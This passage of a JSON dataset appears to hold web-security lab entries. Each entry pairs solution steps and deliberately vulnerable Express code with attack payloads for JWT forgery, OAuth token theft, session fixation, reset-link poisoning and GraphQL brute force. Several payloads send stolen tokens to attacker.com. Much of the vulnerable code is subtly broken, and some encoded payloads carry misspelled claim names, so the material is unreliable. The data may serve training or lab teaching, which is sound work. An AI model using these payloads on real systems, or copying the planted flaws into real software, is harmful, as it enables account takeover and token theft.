    "payloads": [
      "POST /reset HTTP/1.1\nHost: attacker.com",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: attacker.com"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via x5c header injection",
    "Lab Description": "The JWT validation accepts arbitrary x5c headers containing embedded certificates. The application doesn't verify certificate chain. To solve: forge admin token by embedding attacker-generated certificate in x5c header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note x5c header support",
      "Generate self-signed certificate using OpenSSL",
      "Extract public key and create matching JWT",
      "Embed certificate chain in x5c header",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header.x5c) {const cert = decoded.header.x5c[0];jwt.verify(token, cert);}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsIng1YyI6WyJhdHRhY2tlci1jZXJ0Il19.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1YyI6WyJmYWtlLWNlcnQtaGVyZSJdfQ.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1YyI6WyJtYWxpY2lvdXMtY2VydGlmaWNhdGUiXX0.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT typ header injection in healthcare API",
    "Lab Description": "The JWT validation vulnerable to algorithm confusion via typ header manipulation. The application processes tokens with typ=None without proper verification. To solve: forge admin token by switching algorithm to none and removing signature.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze typ header",
      "Modify typ header to 'None' and remove signature",
      "Change payload to include admin privileges",
      "Submit token in Authorization header",
      "Access patient records to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/records', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, null, {algorithms: ['HS256','none']});if(decoded.typ === 'None') decoded = jwt.decode(token);if(decoded.role === 'admin') res.send('Patient records');} catch(e) {res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiTm9uZSJ9.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJOb25lIiwiYWxnIjoibm9uZSJ9.eyJhZG1pbiI6dHJ1ZX0.",
      "eyJhbGciOiJOb25lIiwidHlwIjoiTk9ORSJ9.eyJhY2Nlc3MiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through postMessage in embedded iframes. The application doesn't validate message origins in token callbacks. To solve: steal OAuth token by crafting malicious page that intercepts postMessage communications.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify iframe usage",
      "Create malicious HTML page with postMessage listener",
      "Lure victim to visit page containing legitimate OAuth iframe",
      "Capture access token sent via postMessage",
      "Use token to query protected API endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = generateToken();res.send(`<script>window.opener.postMessage('${token}','*')</script>`);});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://victim.com/oauth/callback\"></iframe><script>window.addEventListener('message',e=>{document.location='https://attacker.com/?token='+e.data});</script>",
      "window.open('https://victim.com/oauth','_blank').onmessage=e=>fetch('https://attacker.com/?token='+e.data)",
      "<div id=\"steal\"></div><script>window.onmessage=e=>document.getElementById('steal').innerHTML=e.data;</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket initialization",
    "Lab Description": "The GraphQL subscription endpoint assigns sessions during websocket connection. The application reuses session cookies from HTTP requests without regeneration. To solve: fixate victim's session by forcing websocket connection with predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture GraphQL websocket handshake with Burp Suite",
      "Note session cookie assignment during connection",
      "Craft malicious page initiating subscription with fixed session",
      "Induce victim to visit page while maintaining connection",
      "Execute privileged GraphQL operations through websocket"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { createServer } = require('http');const { SubscriptionServer } = require('subscriptions-transport-ws');const app = express();const server = createServer(app);SubscriptionServer.create({onConnect: (params, socket) => {socket.session = socket.upgradeReq.headers.cookie;}}, {server, path: '/graphql'});app.listen(3000);",
    "payloads": [
      "new WebSocket('ws://victim.com/graphql','session=attacker_sid')",
      "const ws = new WebSocket('ws://victim.com/graphql');ws.onopen=()=>{ws.send(JSON.stringify({query:'subscription{data}'}))}",
      "<script>const client = new SubscriptionClient('ws://victim.com/graphql',{connectionParams:{session:'attacker_sid'}})</script>"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Original-Host header",
    "Lab Description": "The password reset functionality trusts X-Original-Host header for link generation. The application doesn't validate host headers against allowed domains. To solve: poison reset link to point to attacker server and capture token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Original-Host: attacker.com header",
      "Submit request and observe poisoned reset link",
      "Wait for victim to click link and capture token",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const host = req.headers['x-original-host'] || req.headers.host;const token = generateToken();res.send(`Reset link: https://${host}/reset?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Original-Host: attacker.com",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nX-Forwarded-Host: attacker.com\nX-Original-Host: attacker.com"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jwk header injection",
    "Lab Description": "The JWT validation accepts arbitrary jwk headers containing embedded keys. The application doesn't verify key provenance. To solve: forge admin token by embedding attacker-generated public key in jwk header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note jwk header support",
      "Generate RSA key pair using OpenSSL",
      "Create JWT with jwk header containing public key",
      "Sign token with matching private key",
      "Submit to privileged endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header.jwk) {jwt.verify(token, decoded.header.jwk);}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiYXR0YWNrZXIta2V5In19.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoibWFsbGljaW91cy1rZXkifX0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiZXZpbC1wdWJsaWMta2V5In19.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT cty header injection in banking API",
    "Lab Description": "The JWT validation vulnerable to content type confusion via cty header manipulation. The application processes tokens with cty=text/plain without signature verification. To solve: forge admin token by switching content type and removing signature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze cty header",
      "Modify cty header to 'text/plain' and remove signature",
      "Change payload to include admin privileges",
      "Submit token in Authorization header",
      "Access transaction history to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/transactions', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, null, {algorithms: ['HS256']});if(decoded.header.cty === 'text/plain') decoded = jwt.decode(token);if(decoded.role === 'admin') res.send('Transaction records');} catch(e) {res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsImN0eSI6InRleHQvcGxhaW4ifQ.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJjdHkiOiJ0ZXh0L3BsYWluIiwiYWxnIjoiSFMyNTYifQ.eyJhZG1pbiI6dHJ1ZX0.",
      "eyJhbGciOiJIUzI1NiIsImN0eSI6InRleHQvcGxhaW4ifQ.eyJhY2Nlc3MiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebSocket in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through WebSocket connection parameters. The application embeds tokens in WebSocket URLs without validation. To solve: steal OAuth token by intercepting WebSocket initialization requests.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify WebSocket usage",
      "Intercept WebSocket connection request containing token",
      "Capture access token from WebSocket URL parameters",
      "Use token to query protected API endpoints",
      "Access user profile data to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({ noServer: true });app.get('/chat', (req, res) => {const token = req.query.token;res.send(`<script>new WebSocket('ws://victim.com/ws?token=${token}')</script>`);});wss.on('connection', ws => {ws.send('Connected');});app.listen(3000);",
    "payloads": [
      "new WebSocket('ws://victim.com/ws?token=stolen-token')",
      "const ws = new WebSocket(`ws://victim.com/ws?token=${document.cookie.match(/token=([^;]+)/)[1]}`)",
      "<iframe src=\"javascript:new WebSocket('ws://victim.com/ws?token='+localStorage.getItem('token'))\"></iframe>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 push promise",
    "Lab Description": "The HTTP/2 server pushes session cookies via push promises without proper validation. The application accepts pushed cookies from unauthorized sources. To solve: fixate victim's session by injecting malicious push promises containing predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture HTTP/2 traffic with Burp Suite to analyze push promises",
      "Craft malicious push promise containing session cookie",
      "Intercept victim's connection and inject push promise",
      "Hijack authenticated session using fixated cookie",
      "Access privileged resources to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const spdy = require('spdy');const app = express();app.get('/', (req, res) => {res.push('/cookie', {'set-cookie':'session=attacker_sid'}, (err, stream) => {stream.end();});res.send('Home page');});spdy.createServer(options, app).listen(3000);",
    "payloads": [
      "GET / HTTP/2\nHost: victim.com\nAccept: */*",
      "PUSH_PROMISE /cookie\nHost: victim.com\nset-cookie: session=attacker_sid",
      "GET /account HTTP/2\nHost: victim.com\nCookie: session=attacker_sid"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Rewrite-URL header",
    "Lab Description": "The password reset functionality trusts X-Rewrite-URL header for link generation. The application doesn't validate rewrite headers against allowed domains. To solve: poison reset link to point to attacker server and capture token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Rewrite-URL: https://attacker.com/reset header",
      "Submit request and observe poisoned reset link",
      "Wait for victim to click link and capture token",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const url = req.headers['x-rewrite-url'] || 'https://victim.com/reset';const token = generateToken();res.send(`Reset link: ${url}?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Rewrite-URL: https://attacker.com/reset",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nX-Original-URL: /reset\nX-Rewrite-URL: https://attacker.com/reset"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via x5t header injection",
    "Lab Description": "The JWT validation accepts arbitrary x5t headers containing certificate thumbprints. The application doesn't verify certificate chain integrity. To solve: forge admin token by spoofing certificate thumbprint in x5t header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note x5t header support",
      "Generate self-signed certificate using OpenSSL",
      "Calculate SHA-1 thumbprint of certificate",
      "Create JWT with x5t header matching thumbprint",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header.x5t) {jwt.verify(token, {thumbprint:decoded.header.x5t});}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsIng1dCI6ImF0dGFja2VyLXRodW1icHJpbnQifQ.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dCI6Im1hbGxpY2lvdXMtdGh1bWJwcmludCJ9.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dCI6ImV2aWwtdGh1bWJwcmludCJ9.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT alg=none bypass in healthcare API",
    "Lab Description": "The JWT validation accepts unsigned tokens when alg=none is specified in the header. The application fails to properly validate token signatures. To solve: forge an admin token by setting algorithm to none and removing the signature.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite",
      "Modify header to set alg=none",
      "Remove signature section entirely",
      "Change payload to include admin role",
      "Submit modified token to access patient records"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/patient-records', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, 'secret', {algorithms: ['HS256','none']});if(decoded.role === 'admin') res.json({records: 'sensitive data'});} catch(e) {res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
      "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJhY2Nlc3MiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via Referer header",
    "Lab Description": "The OAuth implementation leaks authorization codes through Referer headers when loading external resources. The application fails to strip sensitive tokens from Referer headers. To solve: steal an OAuth token by forcing a request to an attacker-controlled domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept OAuth flow with Burp Suite",
      "Inject malicious iframe pointing to attacker domain",
      "Capture authorization code in server logs",
      "Exchange code for access token",
      "Query userinfo endpoint with stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const code = req.query.code;res.send('<script src=\"https://attacker.com/steal?code='+code+'\"></script>');});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://victim.com/oauth?response_type=code&client_id=client&redirect_uri=https://attacker.com\"></iframe>",
      "<img src=\"https://attacker.com/log?ref=\"+document.referrer>",
      "<link rel=\"stylesheet\" href=\"https://attacker.com/steal?ref=\"+encodeURIComponent(document.referrer)>"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket connection",
    "Lab Description": "The GraphQL subscription endpoint assigns sessions during websocket initialization without proper validation. The application reuses session IDs from connection parameters. To solve: fixate a victim's session by forcing them to connect with a predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture websocket handshake with Burp Suite",
      "Note session parameter in connection URL",
      "Craft malicious page initiating subscription",
      "Induce victim to visit page",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { createServer } = require('http');const { SubscriptionServer } = require('subscriptions-transport-ws');const app = express();const server = createServer(app);SubscriptionServer.create({onConnect: (params, socket) => {socket.session = socket.upgradeReq.url.split('session=')[1];}}, {server, path: '/graphql'});app.listen(3000);",
    "payloads": [
      "new WebSocket('ws://victim.com/graphql?session=attacker_sid')",
      "const ws = new WebSocket(`ws://victim.com/graphql?session=${document.cookie.match(/session=([^;]+)/)[1]}`)",
      "<script>const client = new SubscriptionClient('ws://victim.com/graphql?session=attacker_sid')</script>"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Forwarded-Prefix",
    "Lab Description": "The password reset functionality trusts X-Forwarded-Prefix header for link generation without validation. The application constructs reset links using untrusted headers. To solve: poison the reset link to point to an attacker-controlled domain.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Forwarded-Prefix: https://attacker.com header",
      "Submit request and capture poisoned link",
      "Wait for victim to click link",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const prefix = req.headers['x-forwarded-prefix'] || 'https://victim.com';const token = generateToken();res.send(`Reset link: ${prefix}/reset?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Forwarded-Prefix: https://attacker.com",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nX-Forwarded-Host: attacker.com\nX-Forwarded-Prefix: https://attacker.com"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header",
    "Lab Description": "The JWT validation accepts arbitrary jku headers pointing to external public keys. The application doesn't verify the key server's authenticity. To solve: forge an admin token by hosting a malicious public key and referencing it in the jku header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT with Burp Suite",
      "Generate RSA key pair using OpenSSL",
      "Host public key on attacker-controlled server",
      "Create token with jku pointing to malicious key",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header.jku) {fetch(decoded.header.jku).then(key => {jwt.verify(token, key);});}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL3B1YmxpYy5rZXkifQ.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImpydSI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9tYWxpY2lvdXMua2V5In0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImprZSI6Imh0dHBzOi8vZXZpbC5jb20va2V5In0.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT cnf claim injection in healthcare API",
    "Lab Description": "The JWT validation vulnerable to key confusion via cnf claim manipulation. The application processes cnf claims without proper verification of key ownership. To solve: forge admin token by injecting malicious cnf claim pointing to attacker-controlled public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze cnf claim",
      "Generate RSA key pair using OpenSSL",
      "Craft JWT with cnf claim containing attacker's public key",
      "Sign token with matching private key",
      "Submit to privileged endpoint to access patient records"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/records', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.payload.cnf) {jwt.verify(token, decoded.payload.cnf.jwk);}if(decoded.payload.role==='admin') res.json({records: 'sensitive data'});} catch(e) {res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJjbWYiOnsianJrIjp7Imt0eSI6IlJTQSIsIm4iOiJhdHRhY2tlci1wdWJsaWMta2V5In19fQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwiY25mIjp7Imp3ayI6eyJrdHkiOiJSU0EiLCJuIjoibWFsbGljaW91cy1wdWJsaWMta2V5In19fQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3MiOiJhZG1pbiIsImNuZiI6eyJqd2siOnsia3R5IjoiUlNBIiwibiI6ImV2aWwtcHVibGljLWtleSJ9fX0.fake-signature"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebRTC in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through WebRTC ICE candidates. The application embeds tokens in STUN/TURN server credentials without proper sanitization. To solve: steal OAuth token by intercepting WebRTC negotiation messages.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify WebRTC usage",
      "Intercept WebRTC offer/answer exchange",
      "Extract access token from ICE candidate credentials",
      "Use token to query protected API endpoints",
      "Access user profile data to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/video-chat', (req, res) => {const token = req.query.token;res.send(`<script>new RTCPeerConnection({iceServers:[{urls:'stun:stun.victim.com',credential:'${token}'}]})</script>`);});app.listen(3000);",
    "payloads": [
      "new RTCPeerConnection({iceServers:[{urls:'turn:attacker.com',credential:'stolen-token'}]})",
      "pc=new RTCPeerConnection();pc.onicecandidate=e=>{if(e.candidate)fetch('https://attacker.com/?token='+e.candidate.credential)}",
      "<iframe src=\"javascript:new RTCPeerConnection({iceServers:[{urls:'stun:stun.victim.com',credential:localStorage.getItem('token')}]})\"></iframe>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 early data",
    "Lab Description": "The HTTP/3 server accepts session cookies in early data (0-RTT) without proper validation. The application reuses session IDs from previous connections. To solve: fixate victim's session by forcing 0-RTT request with predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture HTTP/3 traffic with Burp Suite to analyze early data",
      "Note session cookie assignment during initial connection",
      "Craft malicious 0-RTT request with fixed session",
      "Induce victim to reconnect while maintaining session",
      "Hijack authenticated session through early data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const spdy = require('spdy');const app = express();app.get('/', (req, res) => {if(req.earlyData) res.cookie('session', req.query.sid||generateId());res.send('Home page');});spdy.createServer({allowHTTP1:true,earlyData:true}, app).listen(3000);",
    "payloads": [
      "GET /?sid=attacker_sid HTTP/3\nHost: victim.com\nEarly-Data: 1",
      "GET /account HTTP/3\nHost: victim.com\nCookie: session=attacker_sid",
      "fetch('https://victim.com/',{method:'GET',headers:{'Early-Data':'1'},credentials:'include'})"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Original-URL header",
    "Lab Description": "The password reset functionality trusts X-Original-URL header for link generation without validation. The application constructs reset links using untrusted headers. To solve: poison reset link to point to attacker-controlled domain.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Original-URL: https://attacker.com/reset header",
      "Submit request and capture poisoned link",
      "Wait for victim to click link",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const url = req.headers['x-original-url'] || 'https://victim.com/reset';const token = generateToken();res.send(`Reset link: ${url}?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Original-URL: https://attacker.com/reset",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nX-Forwarded-Host: attacker.com\nX-Original-URL: https://attacker.com/reset"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via x5t#S256 header injection",
    "Lab Description": "The JWT validation accepts arbitrary x5t#S256 headers containing certificate thumbprints. The application doesn't verify certificate chain integrity. To solve: forge admin token by spoofing SHA-256 certificate thumbprint in x5t#S256 header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note x5t#S256 header support",
      "Generate self-signed certificate using OpenSSL",
      "Calculate SHA-256 thumbprint of certificate",
      "Create JWT with x5t#S256 header matching thumbprint",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header['x5t#S256']) {jwt.verify(token, {thumbprint:decoded.header['x5t#S256']});}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsIng1dCNTMjU2IjoiYXR0YWNrZXItdGh1bWJwcmludCJ9.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dCNTMjU2IjoibWFsbGljaW91cy10aHVtYnByaW50In0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dCNTMjU2IjoiZXZpbC10aHVtYnByaW50In0.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API",
    "Lab Description": "The lab's authentication system uses JWTs with improper signature validation. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: forge a valid JWT for admin user by exploiting signature verification flaws.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept login request with Burp Suite to capture a valid JWT",
      "Decode the JWT using jwt.io to analyze structure",
      "Modify the alg header to 'none' and change the role to 'admin'",
      "Remove the signature portion entirely (leave it empty)",
      "Submit the modified token in Authorization header to access admin panel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];const decoded = jwt.decode(token, {complete: true});if (decoded.header.alg === 'none') {const payload = decoded.payload;if (payload.user === 'admin') res.send('Admin dashboard');else res.status(403).send('Forbidden');} else {try {jwt.verify(token, 'secretkey');res.send('Valid token');} catch {res.status(401).send('Invalid token');}}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via open redirect",
    "Lab Description": "The OAuth implementation leaks authorization codes through unvalidated redirect URLs. The application fails to verify redirect_uri against whitelisted domains. To solve: steal an OAuth token by chaining an open redirect with the OAuth flow.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth initiation endpoint with Postman",
      "Craft malicious redirect_uri pointing to attacker domain",
      "Intercept authorization flow with OWASP ZAP",
      "Capture leaked code parameter in redirect",
      "Exchange code for access token at OAuth token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/authorize', (req, res) => {const {client_id, redirect_uri, state} = req.query;if (client_id === 'legitapp') {const code = 'RANDOM_OAUTH_CODE';res.redirect(`${redirect_uri}?code=${code}&state=${state}`);} else {res.status(400).send('Invalid client');}});app.post('/oauth/token', (req, res) => {if (req.body.code === 'RANDOM_OAUTH_CODE') {res.json({access_token: 'SECRET_TOKEN'});} else {res.status(401).send('Invalid code');}});app.listen(3000);",
    "payloads": [
      "/oauth/authorize?client_id=legitapp&redirect_uri=https://attacker.com&response_type=code",
      "/oauth/authorize?client_id=legitapp&redirect_uri=http://localhost&response_type=token"
    ]
  },
  {
    "Lab scenario": "GraphQL batching attack on auth endpoint",
    "Lab Description": "The GraphQL API allows query batching that bypasses rate limiting on authentication attempts. The application processes batched queries sequentially without cumulative rate checks. To solve: brute-force credentials by sending 100 login attempts in a single batch request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze GraphQL schema with introspection query",
      "Craft batch mutation containing multiple login attempts",
      "Use Postman to send JSON array of auth mutations",
      "Identify successful attempt by response differences",
      "Extract valid credentials from the matching response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {ApolloServer, gql} = require('apollo-server-express');const typeDefs = gql`type Mutation {login(username: String!, password: String!): String!}`;const resolvers = {Mutation: {login: (_, {username, password}) => {if (username === 'admin' && password === 'secret') return 'VALID_TOKEN';throw new Error('Invalid credentials');}}};const server = new ApolloServer({typeDefs, resolvers});const app = require('express')();server.applyMiddleware({app});app.listen(4000);",
    "payloads": [
      "[{\"query\":\"mutation {login(username:\\\"admin\\\", password:\\\"guess1\\\")}\"},{\"query\":\"mutation {login(username:\\\"admin\\\", password:\\\"guess2\\\")}\"}]",
      "[{\"query\":\"mutation($pass:String!){login(username:\\\"admin\\\",password:$pass)}\",\"variables\":{\"pass\":\"test\"}}]"
    ]
  },
  {
    "Lab scenario": "Session fixation via subdomain cookie scope",
    "Lab Description": "The application sets session cookies without proper domain restrictions, allowing fixation attacks across subdomains. The vulnerable component accepts pre-set session IDs from untrusted subdomains. To solve: fix a session cookie on a subdomain then trick the victim into authenticating with it.",
